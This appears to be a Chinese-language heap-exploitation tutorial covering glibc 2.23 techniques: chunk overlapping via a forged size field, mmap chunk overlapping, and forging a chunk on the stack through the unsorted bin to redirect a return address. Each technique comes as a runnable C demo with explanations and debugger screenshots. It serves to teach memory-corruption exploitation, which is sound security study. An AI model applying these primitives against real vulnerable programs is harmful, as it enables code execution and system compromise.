
```c
#include <stdio.h>

#include <stdlib.h>

#include <string.h>

#include <stdint.h>

#include <malloc.h>



int main(){

  

  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;

  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;

  int prev_in_use = 0x1;



  fprintf(stderr, "\n一开始分配 5 个 chunk");

  p1 = malloc(1000);

  p2 = malloc(1000);

  p3 = malloc(1000);

  p4 = malloc(1000);

  p5 = malloc(1000);



  real_size_p1 = malloc_usable_size(p1);

  real_size_p2 = malloc_usable_size(p2);

  real_size_p3 = malloc_usable_size(p3);

  real_size_p4 = malloc_usable_size(p4);

  real_size_p5 = malloc_usable_size(p5);



  fprintf(stderr, "\nchunk p1 从 %p 到 %p", p1, (unsigned char *)p1+malloc_usable_size(p1));

  fprintf(stderr, "\nchunk p2 从 %p 到 %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));

  fprintf(stderr, "\nchunk p3 从 %p 到 %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));

  fprintf(stderr, "\nchunk p4 从 %p 到 %p", p4, (unsigned char *)p4+malloc_usable_size(p4));

  fprintf(stderr, "\nchunk p5 从 %p 到 %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));



  memset(p1,'A',real_size_p1);

  memset(p2,'B',real_size_p2);

  memset(p3,'C',real_size_p3);

  memset(p4,'D',real_size_p4);

  memset(p5,'E',real_size_p5);

  

  fprintf(stderr, "\n释放掉堆块 p4，在这种情况下不会用 top chunk 合并\n");

  free(p4);



  fprintf(stderr, "\n假设 p1 上的漏洞，该漏洞会把 p2 的 size 改成 p2+p3 的 size\n");

  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2;

  fprintf(stderr, "\nfree p2 的时候分配器会因为 p2+p2.size 的结果指向 p4，而误以为下一个 chunk 是 p4\n");

  fprintf(stderr, "\n这样的话将会 free 掉的 p2 将会包含 p3\n");

  free(p2);

  

  fprintf(stderr, "\n现在去申请 2000 大小的 chunk p6 的时候，会把之前释放掉的 p2 与 p3 一块申请回来\n");

  p6 = malloc(2000);

  real_size_p6 = malloc_usable_size(p6);



  fprintf(stderr, "\nchunk p6 从 %p 到 %p", p6,  (unsigned char *)p6+real_size_p6);

  fprintf(stderr, "\nchunk p3 从 %p 到 %p\n", p3, (unsigned char *) p3+real_size_p3);



  fprintf(stderr, "\np3 中的内容: \n\n");

  fprintf(stderr, "%s\n",(char *)p3);



  fprintf(stderr, "\n往 p6 中写入\"F\"\n");

  memset(p6,'F',1500);



  fprintf(stderr, "\np3 中的内容: \n\n");

  fprintf(stderr, "%s\n",(char *)p3);

}
```

首先申请 5 个 chunk，分别是`p1`，`p2`，`p3`，`p4`，`p5`

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_7E9K9U9N7548YHX.jpg "image.png")

然后`free`掉`p4`，此时`p2`的`size`是`0x3f0`

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_2U5KDHGWRJVYX6E.jpg "image.png")

更改掉`p2`的`size`为`0x7e0`，直接把`p3`给包含进去

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_YPQX779SX5Y98CR.jpg "image.png")

再次去`malloc(0x7e0)`大小的 chunk`p6`会把包含`p3`的`p2`给申请到，这样再去编辑`p6`的时候也可以编辑到`p3`

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_PV6UJRKWRXY3M3U.jpg "image.png")

# mmap_overlapping_chunks

ubuntu16.04 glibc 2.23

```c
#include <stdlib.h>

#include <stdio.h>



int main(){



    int* ptr1 = malloc(0x10); 



    printf("这种技术依然是 overlapping 但是针对的是比较大的 (通过 mmap 申请的)\n");

    printf("分配大的 chunk 是比较特殊的，因为他们分配在单独的内存中，而不是普通的堆中\n");

    printf("分配三个大小为 0x100000 的 chunk \n\n");



    long long* top_ptr = malloc(0x100000);

    printf("第一个 mmap 块位于 Libc 上方： %p\n",top_ptr);

    long long* mmap_chunk_2 = malloc(0x100000);

    printf("第二个 mmap 块位于 Libc 下方： %p\n", mmap_chunk_2);

    long long* mmap_chunk_3 = malloc(0x100000);

    printf("第三个 mmap 块低于第二个 mmap 块: %p\n", mmap_chunk_3);



    printf("\n当前系统内存布局\n" \

"================================================\n" \

"running program\n" \

"heap\n" \

"....\n" \

"third mmap chunk\n" \

"second mmap chunk\n" \

"LibC\n" \

"....\n" \

"ld\n" \

"first mmap chunk\n"

"===============================================\n\n" \

);

    

    printf("第一个 mmap 的 prev_size: 0x%llx\n", mmap_chunk_3[-2]);

    printf("第三个 mmap 的 size: 0x%llx\n\n", mmap_chunk_3[-1]);



    printf("假设有一个漏洞可以更改第三个 mmap 的大小，让他与第二个 mmap 块重叠\n");  

    mmap_chunk_3[-1] = (0xFFFFFFFFFD & mmap_chunk_3[-1]) + (0xFFFFFFFFFD & mmap_chunk_2[-1]) | 2;

    printf("现在改掉的第三个 mmap 块的大小是: 0x%llx\n", mmap_chunk_3[-1]);

    printf("free 掉第三个 mmap 块,\n\n");



    free(mmap_chunk_3); 



    printf("再分配一个很大的 mmap chunk\n");

    long long* overlapping_chunk = malloc(0x300000);

    printf("新申请的 Overlapped chunk 在: %p\n", overlapping_chunk);

    printf("Overlapped chunk 的大小是: 0x%llx\n", overlapping_chunk[-1]);



    int distance = mmap_chunk_2 - overlapping_chunk;

    printf("新的堆块与第二个 mmap 块之间的距离: 0x%x\n", distance);

    printf("写入之前 mmap chunk2 的 index0 写的是: %llx\n", mmap_chunk_2[0]);

    

    printf("编辑 overlapping chunk 的值\n");

    overlapping_chunk[distance] = 0x1122334455667788;



    printf("写之后第二个 chunk 的值: 0x%llx\n", mmap_chunk_2[0]);

    printf("Overlapped chunk 的值: 0x%llx\n\n", overlapping_chunk[distance]);

    printf("新块已与先前的块重叠\n");

}
```

当我们调用一个相当大的块的时候会用`mmap`来代替`malloc`获取一块单独的内存来替代普通的堆，释放的时候会用`munmap`

一开始申请了 3 个`0x100000`大小的

此时的布局大概是这样的

```text
running program

heap

....

third mmap chunk 0x7ffff780b010

second mmap chunk 0x7ffff790c010

LibC

....

ld

first mmap chunk 0x7ffff7ed7010
```

然后把第三个的`size`改成`0x202002`，`free`掉第三个，然后再去`malloc(0x300000)`

新的在`0x7ffff770c010`

第三个`0x7ffff780b010`大小`0x202002`

第二个`0x7ffff790c010`

现在在第三个上是`0x202000`大小的，接下来去申请`0x300000`大小的，因为前面已经有了`0x201000`，所以多申请`0xFF000`就够了 (`0x7ffff780b010-0x7ffff770c010`)

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_HH55GS2V5JNS2U3.jpg "image.png")

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_J8KDNKQA4457FY7.jpg "image.png")

这样通过对新创建的堆块进行写操作就可以覆盖掉原本第二个那里

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_K2BNE6U8CK2WR6Y.jpg "image.png")

# unsorted_bin_into_stack

ubuntu16.04 glibc 2.23

```c
#include <stdio.h>

#include <stdlib.h>

#include <stdint.h>

#include <string.h>



void jackpot(){ fprintf(stderr, "Nice jump d00d\n"); exit(0); }



int main() {

  intptr_t stack_buffer[4] = {0};



  fprintf(stderr, "先申请 victim chunk\n");

  intptr_t* victim = malloc(0x100);

  fprintf(stderr, "再申请一块防止与 top chunk 合并\n");

  intptr_t* p1 = malloc(0x100);



  fprintf(stderr, "把 %p 这块给释放掉, 会被放进 unsorted bin 中\n", victim);

  free(victim);



  fprintf(stderr, "在栈上伪造一个 chunk");

  fprintf(stderr, "设置 size 与指向可写地址的 bk 指针");

  stack_buffer[1] = 0x100 + 0x10;

  stack_buffer[3] = (intptr_t)stack_buffer;



  fprintf(stderr, "假设有一个漏洞可以覆盖 victim 的 size 和 bk 指针\n");

  fprintf(stderr, "大小应与下一个请求大小不同，以返回 fake chunk 而不是这个，并且需要通过检查（2*SIZE_SZ 到 av->system_mem）\n");

  victim[-1] = 32;

  victim[1] = (intptr_t)stack_buffer;



  fprintf(stderr, "现在 malloc 的时候将会返回构造的那个 fake chunk 那里: %p\n", &stack_buffer[2]);

  char *p2 = malloc(0x100);

  fprintf(stderr, "malloc(0x100): %p\n", p2);

  intptr_t sc = (intptr_t)jackpot;

  memcpy((p2+40), &sc, 8);

}
```

一开始申请了两个 chunk

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_SXRKX3AHMDMWMCR.jpg "image.png")

`free`掉第一个 chunk

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_X9GRA2QT8UNRGQB.jpg "image.png")

然后修改掉它的`bk`指针指向在栈上伪造的 fake chunk，同时把这个的`size`给改掉，防止他`malloc`的时候申请到了这个而不是 fake chunk

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_7CPA6MW83MHE56Q.jpg "image.png")

接下来再去`malloc`的时候就可以申请到在栈上伪造的那个 chunk 了

![image.png](https://bbs.kanxue.com/upload/attach/202012/837755_WTPGY8GNB3HKJKA.jpg "image.png")

# unsorted_bin_attack

ubuntu16.04 glibc 2.23

`unsorted bin attack`是控制`unsorted bin`的`bk`指针，达到任意地址改为一个较大的数的目的
